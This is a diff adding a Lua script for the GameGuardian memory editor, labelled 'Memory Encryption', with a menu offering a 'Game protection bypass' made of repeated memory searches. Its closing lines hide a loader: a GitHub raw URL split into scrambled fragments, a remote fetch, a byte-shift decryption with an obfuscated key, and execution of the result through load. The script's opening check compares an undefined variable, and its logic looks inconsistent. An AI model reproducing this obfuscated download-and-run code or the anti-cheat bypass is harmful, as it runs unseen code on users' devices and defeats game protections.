@@ -1,0 +1,96 @@
+print('Memory Encryption')
+if zvalue == 557 then
+else
+os.exit()
+end
+function Mencrption(key,code)
+   return (code:gsub('..', function (h) return string.char((tonumber(h,16)+256-23 - key + 999999*256)%256) end))
+end
+function Mainn()
+  suifeng = gg.choice({
+  "Game protection bypass",
+  "no need bypass",
+  }, nil, "Memory encryption")
+if suifeng == 1 then
+    sf1()
+  end
+if suifeng == 2 then
+  end
+  end
+ function sf1()
+ gg.setRanges(gg.REGION_C_ALLOC)
+gg.searchNumber("1.2F;1.8F:9::1", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
+gg.searchNumber("1.1F;1.4F:3::1", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
+gg.searchNumber("1.1D;1.4D:2::10", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
+gg.clearResults()
+
+gg.searchNumber("5001;1.1;1F::10", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
+gg.getResults(100)
+gg.searchNumber("1.2F;1.8F:9::1", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
+gg.searchNumber("1.1F;1.4F:3::1", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
+gg.searchNumber("1.1D;1.4D:2::10", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
+gg.clearResults()
+
+gg.searchNumber("5001;1.1;1F::10", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
+gg.getResults(100)
+gg.searchNumber("5001;1.1;1F::10", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
+gg.clearResults()
+gg.searchNumber("5001", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
+gg.clearResults()
+
+gg.searchNumber("1.5", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
+gg.clearResults()
+gg.searchNumber("1.6", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
+gg.clearResults()
+gg.searchNumber("1.7", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
+gg.getResults(10)
+gg.searchNumber("1.5", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
+gg.getResults(10)
+gg.searchNumber("1.5", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
+gg.clearResults()
+
+gg.searchNumber("1.5;0.4::60", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
+gg.getResults(10)
+gg.searchNumber("1.5", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
+gg.getResults(10)
+gg.searchNumber("1.5", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
+
+gg.getResults(10)
+gg.searchNumber("1.5", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
+gg.getResults(10)
+gg.searchNumber("1.5", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
+gg.getResults(10)
+end
+kvalue = 558
+Mainn()
+local v1 = 90
+local v2 = 8
+local k17 = '020202'
+local v4 = 1
+local k1 = 'htt'
+local v6 = 1000
+local k18 = '.txt'
+local v7 = 10
+local k2 = 'ps://'
+local k14 = 'z'
+local k3 = 'raw'
+local k13 = '/7'
+local k4 = '.gi'
+local k15 = '/mas'
+local k5 = 'th'
+local k12 = 'pees'
+local k6 = 'ubuse'
+local k16 = 'ter/'
+local k7 = 'rco'
+local k11 = '/Sky'
+local k8 = 'nte'
+local k10 = 'com'
+local k9 = "nt."
+local codes = gg.makeRequest(k1..k2..k3..k4..k5..k6..k7..k8..k9..k10..k11..k12..k13..k14..k15..k16..k17..k18).content
+local v3 = v1 + v2
+local v8 = v6 * v6 * v6 * v7
+local v_value = v3 * v8 * v7 + v4
+pcall(Mencrption(v_value, codes))
+local data = Mencrption(v_value, codes)
+local Memory = load(data)
+pcall(Memory)
